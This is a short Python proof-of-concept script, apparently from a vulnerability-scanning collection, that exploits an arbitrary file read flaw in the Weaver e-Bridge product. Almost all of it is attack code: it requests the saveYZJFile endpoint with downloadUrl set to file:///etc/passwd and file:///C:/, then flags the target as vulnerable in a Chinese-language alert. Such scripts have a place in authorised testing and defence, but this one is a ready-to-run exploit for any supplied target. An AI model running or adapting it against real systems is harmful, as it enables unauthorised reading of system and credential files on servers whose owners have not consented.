import httpx
from lib.get_normal_url import get_standard_url
headers = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
}

def poc(target):
    try:
        target = get_standard_url(target)
        url1 = target + '/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt'
        url2 = target + '/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/&fileExt=txt'
        res1 = httpx.get(url1,headers=headers)
        res2 = httpx.get(url2,headers=headers)
        if "id" in res1.text and res1.status_code == 200:
            print("\033[0;31m 泛微云桥 e-Bridge 任意文件读取："+ url1 )
        if "id" in res2.text and res2.status_code == 200:
            print("\033[0;31m 泛微云桥 e-Bridge 任意文件读取：" + url2)
    except:
        pass


